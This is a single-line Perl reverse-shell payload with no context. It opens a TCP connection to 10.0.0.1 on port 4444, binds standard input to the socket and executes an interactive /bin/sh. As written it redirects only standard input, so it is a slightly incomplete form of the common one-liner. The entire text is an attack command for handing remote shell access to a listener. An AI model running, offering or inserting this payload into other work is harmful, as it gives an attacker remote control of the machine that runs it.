use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("10.0.0.1")));open(STDIN,">&S");exec("/bin/sh -i");
